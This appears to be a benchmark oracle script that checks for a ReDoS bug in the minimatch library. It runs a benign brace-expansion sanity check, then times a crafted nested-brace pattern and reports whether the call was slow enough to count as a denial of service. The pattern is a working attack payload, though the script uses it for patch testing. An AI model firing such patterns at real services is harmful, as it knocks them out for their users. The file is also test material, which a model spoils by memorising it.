'use strict';
const minimatch = require('minimatch');

function result(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  // Benign input first: prove normal braceExpand/minimatch usage works.
  const benignPattern = 'a/{b,c}/*.js';
  const benignExpanded = minimatch.braceExpand(benignPattern);
  if (
    !Array.isArray(benignExpanded) ||
    benignExpanded.length !== 2 ||
    !benignExpanded.includes('a/b/*.js') ||
    !benignExpanded.includes('a/c/*.js')
  ) {
    throw new Error('benign braceExpand sanity check failed: ' + JSON.stringify(benignExpanded));
  }

  const benignMatch = minimatch('a/b/foo.js', benignPattern);
  if (benignMatch !== true) {
    throw new Error('benign minimatch sanity check failed');
  }

  // Benign operation succeeded.
  operation_completed = true;

  // Now exercise the malicious input: a pathological pattern crafted to
  // trigger catastrophic backtracking in the pre-patch braceExpand/regex
  // handling path of minimatch (ReDoS via crafted brace pattern).
  // Choose a bounded size so even the vulnerable version completes within
  // a few seconds, but the timing difference between vulnerable and patched
  // behavior is clearly measurable.
  const marker = 'oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);
  const repeatCount = 28; // bounded, tuned to keep vulnerable runtime within a few seconds
  // Pattern of form "{a,a,a,...}" combined with nested unbalanced braces,
  // designed to stress the pattern-matching / regex-escaping logic that
  // was patched (nobrace shortcut regex changed from /\{.*\}/ to a
  // non-greedy variant, and pattern length / type validation added).
  const maliciousPattern = '(' + '{'.repeat(repeatCount) + marker + '}'.repeat(repeatCount) + ')' + '!'.repeat(repeatCount);

  const start = Date.now();
  let maliciousThrew = false;
  let maliciousResult;
  try {
    maliciousResult = minimatch.braceExpand(maliciousPattern);
  } catch (e) {
    maliciousThrew = true;
  }
  const elapsedMs = Date.now() - start;

  // Threshold: if the call takes an excessive amount of wall-clock time
  // relative to the trivial benign call, treat it as a successful DoS
  // exploitation. We use a generous but bounded threshold (2000ms) to
  // avoid flakiness while still distinguishing vulnerable vs patched
  // behavior, since the patched version performs length/shape checks
  // that make this pattern resolve near-instantly.
  const THRESHOLD_MS = 2000;

  if (elapsedMs >= THRESHOLD_MS) {
    exploit_succeeded = true;
    evidence = 'Malicious braceExpand pattern took ' + elapsedMs + 'ms (threshold ' + THRESHOLD_MS + 'ms), indicating ReDoS/catastrophic backtracking. maliciousThrew=' + maliciousThrew;
  } else {
    exploit_succeeded = false;
    evidence = 'Malicious braceExpand pattern completed in ' + elapsedMs + 'ms (below threshold), no DoS observed. maliciousThrew=' + maliciousThrew + ', resultType=' + (Array.isArray(maliciousResult) ? ('array[' + maliciousResult.length + ']') : typeof maliciousResult);
  }

  result({ operation_completed, exploit_succeeded, evidence });
} catch (err) {
  // Any unexpected crash/exception at setup or benign-operation stage
  // (or an exception propagating from unexpected places) must report
  // operation_completed=false.
  result({
    operation_completed: operation_completed, // remains false unless benign op already succeeded
    exploit_succeeded: false,
    evidence: 'Unexpected exception: ' + (err && err.message ? err.message : String(err))
  });
}
